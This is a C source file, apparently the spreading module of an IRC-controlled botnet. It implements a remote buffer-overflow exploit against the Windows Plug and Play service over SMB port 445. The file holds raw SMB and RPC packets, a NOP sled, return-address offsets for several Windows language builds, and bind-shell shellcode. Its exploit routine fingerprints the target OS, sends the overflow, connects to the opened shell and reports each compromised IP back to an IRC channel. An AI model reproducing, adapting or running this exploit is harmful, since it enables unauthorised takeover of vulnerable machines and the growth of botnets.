/***********************************
*DFNCDFNCDFNCDFNCDFNCDFNCDFNCDFNCDF*
*PnP Exploit Port 445 PRIVATE v.0.3*
*     Original by houseofdabus     *
*DFNCDFNCDFNCDFNCDFNCDFNCDFNCDFNCDF*
***********************************/

 /* #define _WIN32 */

#include "includes.h"
#include "functions.h"

#ifndef NO_PNP

unsigned char SMB_Negotiate[] =
	"\x00\x00\x00\x85\xFF\x53\x4D\x42\x72\x00\x00\x00\x00\x18\x53\xC8"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFE"
	"\x00\x00\x00\x00\x00\x62\x00\x02\x50\x43\x20\x4E\x45\x54\x57\x4F"
	"\x52\x4B\x20\x50\x52\x4F\x47\x52\x41\x4D\x20\x31\x2E\x30\x00\x02"
	"\x4C\x41\x4E\x4D\x41\x4E\x31\x2E\x30\x00\x02\x57\x69\x6E\x64\x6F"
	"\x77\x73\x20\x66\x6F\x72\x20\x57\x6F\x72\x6B\x67\x72\x6F\x75\x70"
	"\x73\x20\x33\x2E\x31\x61\x00\x02\x4C\x4D\x31\x2E\x32\x58\x30\x30"
	"\x32\x00\x02\x4C\x41\x4E\x4D\x41\x4E\x32\x2E\x31\x00\x02\x4E\x54"
	"\x20\x4C\x4D\x20\x30\x2E\x31\x32\x00";


unsigned char SMB_SessionSetupAndX[] =
	"\x00\x00\x00\xA4\xFF\x53\x4D\x42\x73\x00\x00\x00\x00\x18\x07\xC8"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFE"
	"\x00\x00\x10\x00\x0C\xFF\x00\xA4\x00\x04\x11\x0A\x00\x00\x00\x00"
	"\x00\x00\x00\x20\x00\x00\x00\x00\x00\xD4\x00\x00\x80\x69\x00\x4E"
	"\x54\x4C\x4D\x53\x53\x50\x00\x01\x00\x00\x00\x97\x82\x08\xE0\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x57\x00\x69\x00\x6E\x00\x64\x00\x6F\x00\x77\x00\x73\x00\x20\x00"
	"\x32\x00\x30\x00\x30\x00\x30\x00\x20\x00\x32\x00\x31\x00\x39\x00"
	"\x35\x00\x00\x00\x57\x00\x69\x00\x6E\x00\x64\x00\x6F\x00\x77\x00"
	"\x73\x00\x20\x00\x32\x00\x30\x00\x30\x00\x30\x00\x20\x00\x35\x00"
	"\x2E\x00\x30\x00\x00\x00\x00\x00";


unsigned char SMB_SessionSetupAndX2[] =
	"\x00\x00\x00\xDA\xFF\x53\x4D\x42\x73\x00\x00\x00\x00\x18\x07\xC8"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFE"
	"\x00\x08\x20\x00\x0C\xFF\x00\xDA\x00\x04\x11\x0A\x00\x00\x00\x00"
	"\x00\x00\x00\x57\x00\x00\x00\x00\x00\xD4\x00\x00\x80\x9F\x00\x4E"
	"\x54\x4C\x4D\x53\x53\x50\x00\x03\x00\x00\x00\x01\x00\x01\x00\x46"
	"\x00\x00\x00\x00\x00\x00\x00\x47\x00\x00\x00\x00\x00\x00\x00\x40"
	"\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x06\x00\x06\x00\x40"
	"\x00\x00\x00\x10\x00\x10\x00\x47\x00\x00\x00\x15\x8A\x88\xE0\x48"
	"\x00\x4F\x00\x44\x00\x00\xED\x41\x2C\x27\x86\x26\xD2\x59\xA0\xB3"
	"\x5E\xAA\x00\x88\x6F\xC5\x57\x00\x69\x00\x6E\x00\x64\x00\x6F\x00"
	"\x77\x00\x73\x00\x20\x00\x32\x00\x30\x00\x30\x00\x30\x00\x20\x00"
	"\x32\x00\x31\x00\x39\x00\x35\x00\x00\x00\x57\x00\x69\x00\x6E\x00"
	"\x64\x00\x6F\x00\x77\x00\x73\x00\x20\x00\x32\x00\x30\x00\x30\x00"
	"\x30\x00\x20\x00\x35\x00\x2E\x00\x30\x00\x00\x00\x00\x00";


unsigned char SMB_TreeConnectAndX[] =
	"\x00\x00\x00\x5A\xFF\x53\x4D\x42\x75\x00\x00\x00\x00\x18\x07\xC8"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFE"
	"\x00\x08\x30\x00\x04\xFF\x00\x5A\x00\x08\x00\x01\x00\x2F\x00\x00";



unsigned char SMB_TreeConnectAndX_[] =
	"\x00\x00\x3F\x3F\x3F\x3F\x3F\x00";


/* browser */
unsigned char SMB_PipeRequest_browser[] =
	"\x00\x00\x00\x66\xFF\x53\x4D\x42\xA2\x00\x00\x00\x00\x18\x07\xC8"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x78\x04"
	"\x00\x08\x40\x00\x18\xFF\x00\xDE\xDE\x00\x10\x00\x16\x00\x00\x00"
	"\x00\x00\x00\x00\x9F\x01\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x40\x00\x00\x00"
	"\x02\x00\x00\x00\x03\x13\x00\x00\x5C\x00\x62\x00\x72\x00\x6F\x00"
	"\x77\x00\x73\x00\x65\x00\x72\x00\x00\x00";


unsigned char SMB_PNPEndpoint[] =
/* 8d9f4e40-a03d-11ce-8f69-08003e30051b v1.0: pnp */
	"\x00\x00\x00\x9C\xFF\x53\x4D\x42\x25\x00\x00\x00\x00\x18\x07\xC8"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x78\x04"
	"\x00\x08\x50\x00\x10\x00\x00\x48\x00\x00\x00\x00\x10\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x54\x00\x48\x00\x54\x00\x02"
	"\x00\x26\x00\x00\x40\x59\x00\x00\x5C\x00\x50\x00\x49\x00\x50\x00"
	"\x45\x00\x5C\x00\x00\x00\x40\x00\x05\x00\x0B\x03\x10\x00\x00\x00"
	"\x48\x00\x00\x00\x01\x00\x00\x00\xB8\x10\xB8\x10\x00\x00\x00\x00"
	"\x01\x00\x00\x00\x00\x00\x01\x00\x40\x4E\x9F\x8D\x3D\xA0\xCE\x11"
	"\x8F\x69\x08\x00\x3E\x30\x05\x1B\x01\x00\x00\x00\x04\x5D\x88\x8A"
	"\xEB\x1C\xC9\x11\x9F\xE8\x08\x00\x2B\x10\x48\x60\x02\x00\x00\x00";



unsigned char RPC_call[] =
	"\x00\x00\x08\x90\xFF\x53\x4D\x42\x25\x00\x00\x00\x00\x18\x07\xC8"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x78\x04"
	"\x00\x08\x60\x00\x10\x00\x00\x3C\x08\x00\x00\x00\x01\x00\x00\x00"
	"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x54\x00\x3C\x08\x54\x00\x02"
	"\x00\x26\x00\x00\x40\x4D\x08\x00\x5C\x00\x50\x00\x49\x00\x50\x00"
	"\x45\x00\x5C\x00\x00\x00\x40\x00\x05\x00\x00\x03\x10\x00\x00\x00"
	"\x3C\x08\x00\x00\x01\x00\x00\x00\x24\x08\x00\x00\x00\x00\x36\x00"
	"\x11\x00\x00\x00\x00\x00\x00\x00\x11\x00\x00\x00\x52\x00\x4F\x00"
	"\x4F\x00\x54\x00\x5C\x00\x53\x00\x59\x00\x53\x00\x54\x00\x45\x00"
	"\x4D\x00\x5C\x00\x30\x00\x30\x00\x30\x00\x30\x00\x00\x00\x00\x00"
	"\xFF\xFF\x00\x00\xE0\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
	"\xC0\x07\x00\x00\x00\x00\x00\x00\x90\x90\x90\x90\x90\x90\x90\x90"
	"\xEB\x08\x90\x90\x67\x15\x7a\x76\xEB\x08\x90\x90\x67\x15\x7a\x76"
	"\xEB\x08\x90\x90\x67\x15\x7a\x76\xEB\x08\x90\x90\x67\x15\x7a\x76"
	"\xEB\x08\x90\x90\x67\x15\x7a\x76\xEB\x08\x90\x90\x67\x15\x7a\x76"
	"\xEB\x08\x90\x90\x67\x15\x7a\x76\xEB\x08\x90\x90\x67\x15\x7a\x76"

	/* jmp over - entry point */
	"\xEB\x08\x90\x90"

	/* Exploit will fill the correct offset */
	 "\x90\x90\x90\x90"	
//	 "\x67\x15\x77\x76" /* 0x767a1567 */ /* pop reg; pop reg; retn; - umpnpmgr.dll for spanish*/
//	 "\x67\x15\x7a\x76" /* 0x767a1567 */ /* pop reg; pop reg; retn; - umpnpmgr.dll */
//       "\x67\x15\x74\x76" /* 0x76741567 */ /* pop reg; pop reg; retn; - umpnpmgr.dll for french*/
	

	/* jmp ebx - umpnpmgr.dll
	"\x6f\x36\x7a\x76" */

	"\xEB\x08\x90\x90\x67\x15\x7a\x76"
	"\x90\x90\x90\x90\x90\x90\x90\xEB\x08\x90\x90\x48\x4F\x44\x88\x90"
	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";

unsigned char RPC_call_end[] =
	"\xE0\x07\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00";

/*unsigned char bind_shellcode[] =
	"\x29\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x19"
	"\xf5\x04\x37\x83\xeb\xfc\xe2\xf4\xe5\x9f\xef\x7a\xf1\x0c\xfb\xc8"
	"\xe6\x95\x8f\x5b\x3d\xd1\x8f\x72\x25\x7e\x78\x32\x61\xf4\xeb\xbc"
	"\x56\xed\x8f\x68\x39\xf4\xef\x7e\x92\xc1\x8f\x36\xf7\xc4\xc4\xae"
	"\xb5\x71\xc4\x43\x1e\x34\xce\x3a\x18\x37\xef\xc3\x22\xa1\x20\x1f"
	"\x6c\x10\x8f\x68\x3d\xf4\xef\x51\x92\xf9\x4f\xbc\x46\xe9\x05\xdc"
	"\x1a\xd9\x8f\xbe\x75\xd1\x18\x56\xda\xc4\xdf\x53\x92\xb6\x34\xbc"
	"\x59\xf9\x8f\x47\x05\x58\x8f\x77\x11\xab\x6c\xb9\x57\xfb\xe8\x67"
	"\xe6\x23\x62\x64\x7f\x9d\x37\x05\x71\x82\x77\x05\x46\xa1\xfb\xe7"
	"\x71\x3e\xe9\xcb\x22\xa5\xfb\xe1\x46\x7c\xe1\x51\x98\x18\x0c\x35"
	"\x4c\x9f\x06\xc8\xc9\x9d\xdd\x3e\xec\x58\x53\xc8\xcf\xa6\x57\x64"
	"\x4a\xa6\x47\x64\x5a\xa6\xfb\xe7\x7f\x9d\x1a\x55\x7f\xa6\x8d\xd6"
	"\x8c\x9d\xa0\x2d\x69\x32\x53\xc8\xcf\x9f\x14\x66\x4c\x0a\xd4\x5f"
	"\xbd\x58\x2a\xde\x4e\x0a\xd2\x64\x4c\x0a\xd4\x5f\xfc\xbc\x82\x7e"
	"\x4e\x0a\xd2\x67\x4d\xa1\x51\xc8\xc9\x66\x6c\xd0\x60\x33\x7d\x60"
	"\xe6\x23\x51\xc8\xc9\x93\x6e\x53\x7f\x9d\x67\x5a\x90\x10\x6e\x67"
	"\x40\xdc\xc8\xbe\xfe\x9f\x40\xbe\xfb\xc4\xc4\xc4\xb3\x0b\x46\x1a"
	"\xe7\xb7\x28\xa4\x94\x8f\x3c\x9c\xb2\x5e\x6c\x45\xe7\x46\x12\xc8"
	"\x6c\xb1\xfb\xe1\x42\xa2\x56\x66\x48\xa4\x6e\x36\x48\xa4\x51\x66"
	"\xe6\x25\x6c\x9a\xc0\xf0\xca\x64\xe6\x23\x6e\xc8\xe6\xc2\xfb\xe7"
	"\x92\xa2\xf8\xb4\xdd\x91\xfb\xe1\x4b\x0a\xd4\x5f\xf6\x3b\xe4\x57"
	"\x4a\x0a\xd2\xc8\xc9\xf5\x04\x37";*/

/*#define SET_PORTBIND_PORT(buf, port) \
	*(unsigned short *)(((buf)+186)) = (port)*/


void
convert_name(char *out, char *name)
{
	unsigned long len;

	len = strlen(name);
	out += len * 2 - 1;
	while (len--) {
		*out-- = '\x00';
		*out-- = name[len];
	}
}


char* Offsets[] =
{
	"\x2a\x57\x8c\x75",
	"\x67\x15\x77\x76",
	"\x67\x15\x74\x76",
	"\x79\x3C\x01\x01"
};



BOOL PnP( char *target, void* conn, EXINFO exinfo, int OffNum )
{
	SOCKADDR_IN addr;
	int len;
	int sockfd;
	unsigned short smblen;
	char tmp[1024];
	unsigned char packet[4096];
	unsigned char *ptr;
	char recvbuf[4096];
	IRC* irc=(IRC*)conn;
	BOOL success=FALSE;
	char* thisTarget;
	int pnpbindsize=405;
	int TargetOS, Target;
	char* tOS="";

	WSADATA wsa;
	fWSAStartup(MAKEWORD(2,0), &wsa);

	if ((sockfd = fsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET) return FALSE;

	thisTarget = exinfo.ip;
	TargetOS=FpHost(thisTarget,FP_NP);
	if (TargetOS==OS_UNKNOWN) 
		TargetOS=FpHost(thisTarget,FP_SMB);
	if (TargetOS == OS_WINNT){
		Target=OS_WINNT;
		success=FALSE;
	}else if (TargetOS==OS_WINXP){
		Target=OS_WINXP;
		success=FALSE;
	}else if (TargetOS==OS_WIN2K){
		Target=OS_WIN2K;
		success=TRUE;
	}else{
		success=FALSE;
	}

	ZeroMemory(&addr,sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = finet_addr(thisTarget);
	addr.sin_port = fhtons((unsigned short)exinfo.port);

	if (fconnect(sockfd, (struct sockaddr *)&addr, sizeof(struct sockaddr)) < 0) return FALSE;
	if (fsend(sockfd, (const char *)SMB_Negotiate, sizeof(SMB_Negotiate)-1, 0) < 0) return FALSE;

	len = frecv(sockfd, recvbuf, 4096, 0);
	if ((len <= 10) || (recvbuf[9] != 0)) return FALSE;
	
	if (fsend(sockfd, (const char *)SMB_SessionSetupAndX, sizeof(SMB_SessionSetupAndX)-1, 0) < 0) return FALSE;
	
	len = frecv(sockfd, recvbuf, 4096, 0);
	if (len <= 10) return FALSE;

	if (fsend(sockfd, (const char *)SMB_SessionSetupAndX2, sizeof(SMB_SessionSetupAndX2)-1, 0) < 0) return FALSE;
	
	len = frecv(sockfd, recvbuf, 4096, 0);
	if ((len <= 10) || (recvbuf[9] != 0)) return FALSE;

	ptr = packet;
	memcpy(ptr, SMB_TreeConnectAndX, sizeof(SMB_TreeConnectAndX)-1);
	ptr += sizeof(SMB_TreeConnectAndX)-1;

	sprintf(tmp,"\\\\%s\\IPC$",thisTarget);
	convert_name((char *)ptr, tmp);
	smblen = strlen(tmp)*2;
	ptr += smblen;
	smblen += 9;
	memcpy(packet + sizeof(SMB_TreeConnectAndX)-1-3, &smblen, 1);

	memcpy(ptr, SMB_TreeConnectAndX_, sizeof(SMB_TreeConnectAndX_)-1);
	ptr += sizeof(SMB_TreeConnectAndX_)-1;

	smblen = ptr-packet;
	smblen -= 4;
	memcpy(packet+3, &smblen, 1);

	if (fsend(sockfd, (char *)packet, ptr-packet, 0) < 0) return FALSE;

	len = frecv(sockfd, recvbuf, 4096, 0);
	if ((len <= 10) || (recvbuf[9] != 0)) return FALSE;

	if (fsend(sockfd, (char *)SMB_PipeRequest_browser, sizeof(SMB_PipeRequest_browser)-1, 0) < 0) return FALSE;

	len = frecv(sockfd, recvbuf, 4096, 0);
	if ((len <= 10) || (recvbuf[9] != 0)) return FALSE;

	if (fsend(sockfd, (char *)SMB_PNPEndpoint, sizeof(SMB_PNPEndpoint)-1, 0) < 0) return FALSE;

	len = frecv(sockfd, recvbuf, 4096, 0);
	if ((len <= 10) || (recvbuf[9] != 0)) return FALSE;

	// nop
	ptr = packet;
	memset(packet, '\x90', sizeof(packet));

	// Start prepare header -- dETOX mod --
	memcpy(RPC_call + 260, Offsets[OffNum], 4); 

	// header & offsets
	memcpy(ptr, RPC_call, sizeof(RPC_call)-1);
	ptr += sizeof(RPC_call)-1;

	// shellcode
	unsigned short port;
    port = fhtons(bindport)^(USHORT)0x9999;
    memcpy(&bindshell[176],&port,2);
	memcpy(ptr,bindshell,pnpbindsize-1);

	// end of packet
	memcpy( packet + 2196 - sizeof(RPC_call_end)-1 + 2,
		RPC_call_end,
		sizeof(RPC_call_end)-1);

	// sending...
	if (fsend(sockfd, (char *)packet, 2196, 0) < 0) return FALSE;
	frecv(sockfd, recvbuf, 4096, 0);

	if (!exinfo.silent && exinfo.verbose){
		switch(Target){
		case 1:
			tOS="WINNT";
			break;
		case 2:
			tOS="WIN2K";
			break;
		case 3:
			tOS="WINXP";
			break;
		default:
			tOS="UNKNOWN/2K3/LINUX";
			break;
		}

		irc->privmsg(target,"%s %s: Target OS is %s... (%s).", scan_title, exploit[exinfo.exploit].name, tOS, exinfo.ip);
	}


//	if(success){
		Sleep(2000);
		if (ConnectShell(exinfo,bindport))
		{
			if (!exinfo.silent)
				irc->privmsg(target,"%s %s: Exploiting IP: %s.", scan_title, exploit[exinfo.exploit].name, exinfo.ip);
			exploit[exinfo.exploit].stats++;
		}
		else
			if (!exinfo.silent && exinfo.verbose)
				irc->privmsg(target,"%s %s: Failed to exploit IP: %s.", scan_title, exploit[exinfo.exploit].name, exinfo.ip);
//	}
	return TRUE;
}

BOOL PnP445(char *target, void* conn,EXINFO exinfo)
{
	for(int i=0;i<3;i++){
		if(PnP(target,conn,exinfo,i)) return TRUE;
		else return FALSE;
	}

	return FALSE;
}

#endif